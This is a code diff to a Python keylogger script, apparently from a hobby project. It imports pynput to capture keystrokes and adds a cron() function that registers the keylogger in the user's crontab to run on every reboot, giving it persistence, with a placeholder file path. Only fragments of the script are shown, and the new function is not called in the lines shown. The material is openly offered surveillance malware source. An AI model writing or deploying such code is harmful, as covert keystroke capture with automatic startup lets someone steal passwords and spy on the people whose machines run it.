@@ -1,5 +1,6 @@
 #Install pynput for monitoring keyboard: pip install pynput
 from pynput.keyboard import Key, Listener
+from crontab import CronTab
 
 count = 0
 keys = []
@@ -27,5 +28,13 @@ def on_release(key):
   if key==Key.esc:
     return my_bool 
 
+#create entry in crontab to run keylogger on startup
+def cron():
+    my_cron = CronTab(user=True)
+    job = my_cron.new(command = 'python <FILEPATH>')  #edit filepath to location of keylogger download
+    job.every_reboot()
+    my_cron.write()
+
 with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join() 
+    listener.join()
+    
